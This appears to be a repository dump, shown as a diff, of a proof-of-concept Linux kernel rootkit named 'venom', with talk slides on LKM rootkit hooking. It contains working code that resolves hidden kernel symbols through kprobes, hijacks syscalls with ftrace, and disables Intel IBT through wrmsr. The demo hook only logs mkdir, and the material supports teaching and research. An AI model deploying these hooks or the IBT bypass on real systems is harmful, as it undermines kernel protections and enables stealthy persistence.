@@ -1,0 +1,803 @@
+Project Path: arc_sad0p_venom_xm609xs9
+
+Source Tree:
+
+```txt
+arc_sad0p_venom_xm609xs9
+├── LICENSE
+├── Makefile
+├── README.md
+├── assets
+│   ├── Pasted image 20250929135206.png
+│   ├── Pasted image 20250929173701.png
+│   ├── Pasted image 20251002125218.png
+│   ├── Pasted image 20251002133805.png
+│   ├── Pasted image 20251008143716.png
+│   └── Pasted image 20251008152415.png
+├── docs
+│   └── OnlyMalwareTalk.md
+├── rkit_helper.h
+└── venom.c
+
+```
+
+`LICENSE`:
+
+```
+MIT License
+
+Copyright (c) 2025 sad0p
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+```
+
+`Makefile`:
+
+```
+PWD		:=$(shell pwd)
+obj-m	+= venom.o
+ccflags-y += -DDEBUG
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean
+
+```
+
+`README.md`:
+
+```md
+# venom
+POC Linux kernel rootkit hooking mechanisms for my OnlyMalware talk given on 10/8/2025.
+
+POC is meant for educational purposes and the Obsidian generated markdown for this talk can be found under `docs/` directory.
+
+Shout out to `Lavender` for recording the talk which can be viewed on YT [here](https://youtu.be/ELQ0ZVBbpuA).
+
+Code features IBT toggling for dealing with constraints when using ftrace (this seemed to have been address in later kernel versions).
+
+Compiled and built on 6.16.10-arch1-1 (Arch Linux).
+
+Should work on Linux kernel versions >= 5.7 .
+
+
+
+```
+
+`docs/OnlyMalwareTalk.md`:
+
+```md
+### Who Am I ?
+
+- Network Penetration tester (larper). 
+- Hobby ELF binary voodoo practitioner. 
+	- I enjoy learning about the ELF structure, loading and linking.
+	- Wrote code and papers to expand upon detection of infected ELF artifacts heuristically as well as novel ways of leveraging relocation for ELF binary infection. 
+		- Contributed to hacker e-zines such as VXUG Blackmass v2 and tmp.0ut v2 .
+### Credits
+
+- Linux Kernel Programming by **Kaiwan N.Billimoria** .
+- **TheXcellerator** - https://xcellerator.github.io/ 
+
+### Objectives For This Talk
+
+- Demystify Linux LKM rootkits.
+- Why attackers opt for LKM rootkits.
+- General work flow for writing an LKM.
+- Hooking with the Linux Kernel's own infrastructure using Ftrace and Kprobes.
+- Dealing with IBT (Indirect Branch Tracking). 
+	
+
+### User space vs Kernel space
+
+![Pasted image 20250929135206](../assets/Pasted%20image%2020250929135206.png)
+
+- General idea is that the kernel with the help of CPU will create a separate region of memory and privileges for it self.
+	- Area of memory and allotted privileges privileges here are commonly referred to as **ring 0** . 
+		- Privileges not only allow for **R/W** access on kernel memory, but the ability to execute certain instructions and access highly specialized special registers.
+			- Control Registers (CRs), Debug Registers, Model Specific Registers (MSRs) .
+			- Special instructions example : `rdmsr` , `wrmsr` , `lidt`, `lgdt`  .
+	
+	- Applications such as web browsers and text editors will run in a separate region of memory and with lower privileges, these constitute **user-space**.
+		- The area of memory and allotted privileges are often referred to as **ring 3** .
+
+- Kernel is responsible for critical functionality.
+	- Creation and management of most of the network stack.
+		- I.E - TCP/IP, UDP, ICMP, ARP, Ethernet, etc. 
+			- Roughly from Layer 2 to Layer 4.
+	- Handling of peripheral devices.
+		- Block devices
+			- Hard drives, Solid State Drives.
+		- Character devices (keyboards, mice..)
+			- Keyboards, mice, serial ports...
+		- Network devices
+			- Ethernet cards (NICs) and Wireless Adapters.
+	
+- Code running in the kernel can access kernel memory as well as user-space memory.
+	- Code running in user-space can only access its own process memory **directly**.
+		- Indirect access has to go through the kernel...
+
+- When user-space applications need to do important things they invoke the APIs the kernel exposes.
+	- System calls.
+		- Fundamental vector for communicating with the kernel.
+	- Secondary options.
+		- Device files and character devices.
+			- `/dev/*` directory.
+				- Famous examples: `/dev/urandom` , `/dev/random` , `/dev/shm` , `/dev/null` .
+
+### Linux Kernel Follows A Monolithic Design
+
+- All core functionality for the operating system lives in kernel space.
+- Components in kernel space generally can access other components without restrictions.
+- No reason to discuss **ring 1 & 2** .
+	- Linux doesn't use them despite CPU support due to its monolithic design.
+
+![Pasted image 20250929173701](../assets/Pasted%20image%2020250929173701.png)
+
+
+### Anatomy of An LKM
+
+```C
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+MODULE_AUTHOR("sad0p");
+MODULE_DESCRIPTION("Boiler plate code");
+MODULE_LICENSE("GPL");
+MODULE_VERSION("0.1");
+
+static int __init venom_init(void)
+{
+    printk(KERN_INFO "Hello Eddie\n");
+    return 0;
+}
+
+static void __exit venom_exit(void)
+{
+    printk(KERN_INFO "Bye Eddie\n");
+}
+
+module_init(venom_init);
+module_exit(venom_exit);
+```
+
+- Include directives.
+	- Not the same as userland applications found at `/usr/include`.
+	- Compilation of kernel modules requires a limited source tree that you install.
+		- Typically referred to as `linux-headers-<some-kernel-version>` in your package manager.
+		- We use a `Makefile` to reference the headers for the limited source tree.
+			- Example`/lib/modules/$(uname -r)/`
+    - Installation of kernel headers is paramount to when compiling kernel modules.
+
+- Declaration of entry and exit points.
+	- `module_init()` and `module_exit()` macros.
+		- Takes a function pointer to call the desired functions to start and end the module execution respectively.
+- 
+	![Pasted image 20251002125218](../assets/Pasted%20image%2020251002125218.png)
+
+### Kernel Build System
+
+- Also known as Kbuild .
+	- Linux kernel build system.
+		- Responsible for configuring and compiling the the Linux kernel.
+		- Composed of a top-level `Makefile` , `Kconfig` and `.config`  at the root of the kernel source tree.
+			- We invoke it from our own Makefile shown below.
+
+```
+PWD		:=$(shell pwd)
+obj-m	+= venom.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
+clean:
+		make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean
+```
+
+- ![Pasted image 20251002133805](../assets/Pasted%20image%2020251002133805.png)
+
+
+- `obj-m` string
+	- This is a list of concatenated strings, where each string refers to a particular component that needs to be build as a module by the build system (hence the `*-m` suffix).
+			- We simply specify the name of our source file for our module (replace the `.c` with `.o`).
+			- The one with out `module_init()` and `module_exit()` macros.
+
+- `make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules`
+		- `-C` : Tells make utility to change the current working directory to invoke the Kbuild's root `Makefile` .
+		- `M=$(PWD)` : Passes the directory for the module we want to compile to the root `Makefile` .
+		- `modules` : Specifies the target of compilation are kernel modules to the root `Makefile` .
+
+- TLDR - Our `Makefile` "piggy-backs" Kbuild.
+	- Ensures the kernel modules are compiled with the same parameters as the kernel image itself.
+		- Same configuration and compiler flags.  
+		- **This is paramount** .
+			- Ensures binary compatibility.
+				- Adhere to the kernel's Application Binary Interface (ABI).
+			- Failure to load or kernel crash can occur otherwise.
+
+
+### Linux Kernel Hooking
+
+- Bread and butter for LKM rootkits.
+	- General idea is target important system calls or provide useful functionality.
+		- Evasion
+			- Hiding processes, ports, files, etc .
+		- Persistence
+			- Creating backdoor triggers (can be operated locally or remote) for root access. 
+	
+- Utilizing kernel infrastructure for implementing hooks.
+	- Ftrace and Kprobes.
+		- Ftrace - Function tracer.
+			- Built-in tracing framework meant for debugging, profiling and event tracing.
+				- Accessible from userland via `tracefs` .
+				- APIs available for LKMs.
+	
+		- Kprobes - Kernel probe.
+			-  Allows you to place a breakpoint in most parts of the kernel code.
+				- Also built-in the kernel.
+				- Writes an `int3` instruction at the desired location.
+				- We can register functions (handlers) to be called before and after the `int3` instruction is triggered.
+
+
+### Resolving Function Symbols To Addresses
+
+- `unsigned long kallsyms_lookup_name(const char *name)`
+	-  Resolve symbols to addresses regardless if the symbol is exported or not.
+	-  No longer exported (started in approximately 5.7 kernel). 
+		- Eliminated OOT (Out of Tree) modules from trivially invoking un-exported functionality.
+			- Prior to the change non-GPL modules could access functions exported for GPL licensed modules.
+		- Enforces the Kernel's ABI.
+	
+### Leverage Kprobes To Access `kallsyms_lookup_name(const char *name)`
+
+```c
+struct kprobe {
+	struct hlist_node hlist;
+
+	/* list of kprobes for multi-handler support */
+	struct list_head list;
+
+	/*count the number of times this probe was temporarily disarmed */
+	unsigned long nmissed;
+
+	/* location of the probe point */
+	kprobe_opcode_t *addr;
+
+	/* Allow user to indicate symbol name of the probe point */
+	const char *symbol_name;
+
+	/* Offset into the symbol */
+	unsigned int offset;
+
+	/* Called before addr is executed. */
+	kprobe_pre_handler_t pre_handler;
+
+	/* Called after addr is executed, unless... */
+	kprobe_post_handler_t post_handler;
+
+	/* Saved opcode (which has been replaced with breakpoint) */
+	kprobe_opcode_t opcode;
+
+	/* copy of the original instruction */
+	struct arch_specific_insn ainsn;
+
+	/*
+	 * Indicates various status flags.
+	 * Protected by kprobe_mutex after this kprobe is registered.
+	 */
+	u32 flags;
+};
+```
+
+```c
+
+#include <linux/kprobes.h>
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *symbol_name);
+static kallsyms_lookup_name_t get_kallsyms_lookup_name(void);
+
+static kallsyms_lookup_name_t get_kallsyms_lookup_name(void)
+{
+	kallsyms_lookup_name_t kallsyms_lookup_name_fptr = NULL;
+	struct kprobe kp = {
+		.symbol_name = "kallsyms_lookup_name";
+	};
+		
+	if(!register_kprobe(&kp)) {
+		kallsyms_lookup_name_fptr = (kallsyms_lookup_name_t)kp.addr;
+		unregister_kprobe(&kp);
+	} 
+	return kallsyms_lookup_name_fptr;
+}
+```
+
+![Pasted image 20251008143716](../assets/Pasted%20image%2020251008143716.png)
+
+- Registering a `Kprobe` probe for the named function will resolve the address in the `kp.addr` field.
+### Hooking With Ftrace
+
+```c
+struct ftrace_ops ops = {
+      .func                    = my_callback_func,
+      .flags                   = MY_FTRACE_FLAGS
+      .private                 = any_private_data_structure,
+};
+```
+
+- `int ftrace_set_filter_ips(struct ftrace_ops *ops, unsigned long *ips, unsigned int cnt, int remove, int reset)`
+	- Limit tracing to our desired functions.
+- `int register_ftrace_function(struct ftrace_ops *ops)`
+	- Enable tracing.
+- `int unregister_ftrace_function(struct ftrace_ops *ops)`
+	- Disable tracing.
+
+- We can hook with the following.
+
+```c
+static int hook_kfunction(struct fhook *hk, unsigned int hk_cnt)
+{
+    int error;
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+    kallsyms_lookup_name = get_kallsyms_lookup_name();
+    
+    for(int i = 0; i < hk_cnt; i++, hk++) {
+        /*
+         * Initially hk->mcount_inst_addr will hold the desired function to be hooked.
+         * However after instrumentation with ftrace the address would point to the instrumentation code for ftrace.
+         */
+        hk->mcount_inst_addr = kallsyms_lookup_name(hk->func_name); 
+        pr_debug("%s @ 0x%lx from hook_kfunction\n", hk->func_name, hk->mcount_inst_addr);
+        if(!hk->mcount_inst_addr) {
+            pr_debug("kallsyms_lookup_name() failed when locating %s function\n", hk->func_name); 
+            return -1;
+        }
+        
+        hk->fops.func = ftrace_callback;
+        hk->fops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY; 
+        
+        if((error = ftrace_set_filter_ip(&hk->fops, hk->mcount_inst_addr, 0, 0))) {
+            pr_debug("ftrace_set_filter_ip() failed with error code %d for function %s\n", error, hk->func_name);
+            return -1;
+        }
+
+        hk->status_flag = FLAG_FILTERED; 
+
+        if((error = register_ftrace_function(&hk->fops))) {
+            pr_debug("register_ftrace_function failed with error code %d for function %s\n", error, hk->func_name);
+            return -1;
+        }
+
+        hk->status_flag |= FLAG_TRACED;
+        pr_debug("%s function hooked\n", hk->func_name); 
+        *((unsigned long*)hk->orig_func) = hk->mcount_inst_addr;
+    }
+    return 0;
+}
+```
+
+- Our callback.
+
+```c
+static void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *regs)
+{
+    struct fhook *hk = (struct fhook*) container_of(op, struct fhook, fops);
+    
+    struct pt_regs * _regs;
+    _regs = (struct pt_regs*)regs;
+    if(!within_module(parent_ip, THIS_MODULE))
+        _regs->ip = (unsigned long)hk->new_func;
+}
+```
+
+- Unregistering our hooks.
+
+```c
+static int unhook_kfunction(struct fhook *hk, unsigned int hk_cnt)
+{
+    int error;
+    pr_debug("unregistering hooks and removing any filters...");
+
+    for(int i = 0; i < hk_cnt; i++, hk++) {
+       if((hk->status_flag & FLAG_TRACED) && (error = unregister_ftrace_function(&hk->fops))) {
+           pr_debug("unregister_ftrace_function() failed with error code %d for function %s\n", error, hk->func_name);
+           return -1;  
+       }
+
+       if((hk->status_flag & FLAG_FILTERED) && (error = ftrace_set_filter_ip(&hk->fops, *((unsigned long*)hk->orig_func), 1, 0))) {
+        pr_debug("ftrace_set_filter_ip() failed with error code %d for function %s\n", error, hk-> func_name);
+        return -1; 
+       }
+
+       pr_debug("%s function unhooked\n", hk->func_name);
+    }
+    return 0;
+}
+
+```
+
+
+### Test Run
+```c
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+#include "rkit_helper.h"
+
+MODULE_AUTHOR("sad0p");
+MODULE_DESCRIPTION("Boiler plate code");
+MODULE_LICENSE("GPL");
+MODULE_VERSION("0.1");
+
+static asmlinkage long hook_mkdir(const struct pt_regs *regs); 
+static asmlinkage long (*sys_mkdir)(const struct pt_regs *);
+
+//HOOK() Macro allows us to add as many hooks as we would like.
+
+static struct fhook hk[] = {
+    HOOK("__x64_sys_mkdir", hook_mkdir, &sys_mkdir)
+};
+
+static int __init venom_init(void)
+{
+    pr_debug("Venom in");
+    hook_kfunction(hk, ARRAY_SIZE(hk));
+    return 0;
+}
+
+static asmlinkage long hook_mkdir(const struct pt_regs *regs) 
+{
+	char __user *pathname = (char*)regs->di;
+	char dir_name[NAME_MAX] = {0};
+
+    if(strncpy_from_user(dir_name, pathname, NAME_MAX - 1) < 0)
+        pr_debug("failed to copy mkdir syscall path arg");
+    else
+        pr_debug("successfully intercepted mkdir attempt of %s", dir_name);
+    
+    return sys_mkdir(regs);
+}
+
+static void __exit venom_exit(void)
+{
+    unhook_kfunction(hk, ARRAY_SIZE(hk));
+    pr_info("Venom out\n");
+}
+
+module_init(venom_init);
+module_exit(venom_exit);
+
+```
+
+
+![Pasted image 20251008152415](../assets/Pasted%20image%2020251008152415.png)
+
+
+### Indirect Branch Tracking (IBT)
+
+- Hardware security feature introduced by Intel.
+	- Part of CET (Control Flow Enforcement Technology).
+
+- Mitigates against Return Oriented Programming (ROP) and Jump Oriented Programming (JOP).
+
+- Triggers during indirect branch instructions.
+	- Example: `jmp %rax` or `call %rax` 
+	
+- Legitimate indirect branches should start with `endbr64` or `endbr32` .
+	- An indirect branch to code that doesn't starts with these `endbrX` will cause the CPU to raise a **control-protection** fault (CP#).
+
+- Ultimately a joint venture between the compiler and CPU.
+	- Compile will annotate functions with `endbrX`. 
+	
+- Introduced in Linux kernel in `5.18` and enabled by default in `6.2` .
+
+- IBT creates a hooking problem.
+	- The original function has instrumentation code and we make an indirect-jump to a location without `endbrX` .
+	- This issue seems to have been fixed (literally checked today).
+
+- Solutions.
+	- Flipping the `cr0` write bit protection to add `endbrX` .
+		- Kernel hardened against this.
+		- Potentially destabilizes the kernel...
+	
+	- Turning IBT off through Model Specific Registers. 
+
+```c
+
+#define MSR_IA_S_CET 0x6a2
+#define IBT_BIT_POSITION 2
+
+static void ibt_toggle(void) 
+{
+    u64 msr_value;
+    asm volatile (
+        "rdmsr"
+        : "=A" (msr_value)
+        : "c" (MSR_IA_S_CET)
+    );
+
+    msr_value ^= (1ULL << IBT_BIT_POSITION);
+    asm volatile (
+        "wrmsr"
+        :
+        : "c" (MSR_IA_S_CET),
+        "A" (msr_value)
+    );    
+}
+
+static bool ibt_is_on(void) 
+{
+    u64 msr_value;
+    if(boot_cpu_has(X86_FEATURE_IBT)) {
+        asm volatile (
+            "rdmsr"
+            : "=A" (msr_value)
+            : "c" (MSR_IA_S_CET)
+        );
+        return test_bit(IBT_BIT_POSITION, (unsigned long *)&msr_value);
+
+    }
+    return false;
+}
+
+
+```
+
+
+
+#### Questions ?
+
+
+```
+
+`rkit_helper.h`:
+
+```h
+#ifndef RKIT_HELPER_H
+#define RKIT_HELPER_H
+
+#include <linux/kprobes.h>
+#include <linux/ftrace.h>
+#include <linux/linkage.h>
+#include <linux/kprobes.h>
+#include <linux/kernel.h>
+#include <linux/types.h>
+#include <linux/module.h>
+#include <linux/set_memory.h>
+
+static bool ibt_status = false;
+
+#define HOOK(_func_name, _new_func, _orig_func) \
+{ \
+        .func_name = (_func_name), \
+        .new_func = (_new_func), \
+        .orig_func = (_orig_func), \
+} 
+
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *symbol_name);
+typedef struct fhook hook;
+
+static kallsyms_lookup_name_t get_kallsyms_lookup_name(void);
+static void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *regs);
+static int hook_kfunction(hook *hk, unsigned int hk_cnt);
+static int unhook_kfunction(struct fhook *hk, unsigned int hk_cnt);
+static void ibt_toggle(void); 
+static bool ibt_is_on(void); 
+
+#define FLAG_TRACED (1 << 1)
+#define FLAG_FILTERED (1 << 2)
+
+#define MSR_IA_S_CET 0x6a2
+#define IBT_BIT_POSITION 2
+
+struct fhook {
+    const char *func_name;
+    void *new_func;
+    void *orig_func;
+    unsigned long mcount_inst_addr;
+    int status_flag;
+    struct ftrace_ops fops;
+};
+
+static kallsyms_lookup_name_t get_kallsyms_lookup_name(void)
+{
+	kallsyms_lookup_name_t kallsyms_lookup_name_fptr = NULL;
+	struct kprobe kp = {
+		.symbol_name = "kallsyms_lookup_name"
+	};
+		
+	if(!register_kprobe(&kp)) {
+		kallsyms_lookup_name_fptr = (kallsyms_lookup_name_t)kp.addr;
+		unregister_kprobe(&kp);
+	} 
+	return kallsyms_lookup_name_fptr;
+}
+
+static void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *regs)
+{
+    struct fhook *hk = (struct fhook*) container_of(op, struct fhook, fops);
+    
+    struct pt_regs * _regs;
+    _regs = (struct pt_regs*)regs;
+    if(!within_module(parent_ip, THIS_MODULE))
+        _regs->ip = (unsigned long)hk->new_func;
+}
+
+static int hook_kfunction(struct fhook *hk, unsigned int hk_cnt)
+{
+    int error;
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+    
+    ibt_status = ibt_is_on();
+    if(ibt_status)
+        pr_debug("Detected Indirect Branch Tracking...");
+    if(ibt_status)
+        ibt_toggle();
+
+    kallsyms_lookup_name = get_kallsyms_lookup_name();
+    
+    for(int i = 0; i < hk_cnt; i++, hk++) {
+        /*
+         * Initially hk->mcount_inst_addr will hold the desired function to be hooked.
+         * However after instrumentation with ftrace the address would point to the instrumentation code for ftrace.
+         */
+        hk->mcount_inst_addr = kallsyms_lookup_name(hk->func_name); 
+        if(!hk->mcount_inst_addr) {
+            pr_debug("kallsyms_lookup_name() failed when locating %s function\n", hk->func_name); 
+            return -1;
+        }
+        
+        hk->fops.func = ftrace_callback;
+        hk->fops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY; 
+        
+        if((error = ftrace_set_filter_ip(&hk->fops, hk->mcount_inst_addr, 0, 0))) {
+            pr_debug("ftrace_set_filter_ip() failed with error code %d for function %s\n", error, hk->func_name);
+            return -1;
+        }
+
+        hk->status_flag = FLAG_FILTERED; 
+
+        if((error = register_ftrace_function(&hk->fops))) {
+            pr_debug("register_ftrace_function failed with error code %d for function %s\n", error, hk->func_name);
+            return -1;
+        }
+
+        hk->status_flag |= FLAG_TRACED;
+        pr_debug("%s function hooked\n", hk->func_name); 
+        *((unsigned long*)hk->orig_func) = hk->mcount_inst_addr;
+    }
+    return 0;
+}
+
+static int unhook_kfunction(struct fhook *hk, unsigned int hk_cnt)
+{
+    int error;
+    pr_debug("unregistering hooks and removing any filters...");
+
+    for(int i = 0; i < hk_cnt; i++, hk++) {
+       if((hk->status_flag & FLAG_TRACED) && (error = unregister_ftrace_function(&hk->fops))) {
+           pr_debug("unregister_ftrace_function() failed with error code %d for function %s\n", error, hk->func_name);
+           return -1;  
+       }
+
+       if((hk->status_flag & FLAG_FILTERED) && (error = ftrace_set_filter_ip(&hk->fops, *((unsigned long*)hk->orig_func), 1, 0))) {
+        pr_debug("ftrace_set_filter_ip() failed with error code %d for function %s\n", error, hk-> func_name);
+        return -1; 
+       }
+
+       pr_debug("%s function unhooked\n", hk->func_name);
+    }
+
+    if(ibt_status)
+        ibt_toggle();
+    
+    return 0;
+}
+
+static void ibt_toggle(void) 
+{
+    u64 msr_value;
+    asm volatile (
+        "rdmsr"
+        : "=A" (msr_value)
+        : "c" (MSR_IA_S_CET)
+    );
+
+    msr_value ^= (1ULL << IBT_BIT_POSITION);
+    asm volatile (
+        "wrmsr"
+        :
+        : "c" (MSR_IA_S_CET),
+        "A" (msr_value)
+    );    
+}
+
+static bool ibt_is_on(void) 
+{
+    u64 msr_value;
+    if(boot_cpu_has(X86_FEATURE_IBT)) {
+        asm volatile (
+            "rdmsr"
+            : "=A" (msr_value)
+            : "c" (MSR_IA_S_CET)
+        );
+        return test_bit(IBT_BIT_POSITION, (unsigned long *)&msr_value);
+
+    }
+    return false;
+}
+
+#endif
+
+```
+
+`venom.c`:
+
+```c
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+#include "rkit_helper.h"
+
+MODULE_AUTHOR("sad0p");
+MODULE_DESCRIPTION("Boiler plate code");
+MODULE_LICENSE("GPL");
+MODULE_VERSION("0.1");
+
+static asmlinkage long hook_mkdir(const struct pt_regs *regs); 
+static asmlinkage long (*sys_mkdir)(const struct pt_regs *);
+
+static struct fhook hk[] = {
+    HOOK("__x64_sys_mkdir", hook_mkdir, &sys_mkdir)
+};
+
+static int __init venom_init(void)
+{
+    pr_debug("Venom in");
+    hook_kfunction(hk, ARRAY_SIZE(hk));
+    return 0;
+}
+
+static asmlinkage long hook_mkdir(const struct pt_regs *regs) 
+{
+	char __user *pathname = (char*)regs->di;
+	char dir_name[NAME_MAX] = {0};
+
+    if(strncpy_from_user(dir_name, pathname, NAME_MAX - 1) < 0)
+        pr_debug("failed to copy mkdir syscall path arg");
+    else
+        pr_debug("successfully intercepted mkdir attempt of %s", dir_name);
+    
+    return sys_mkdir(regs);
+}
+
+static void __exit venom_exit(void)
+{
+    unhook_kfunction(hk, ARRAY_SIZE(hk));
+    pr_info("Venom out\n");
+}
+
+module_init(venom_init);
+module_exit(venom_exit);
+
+```
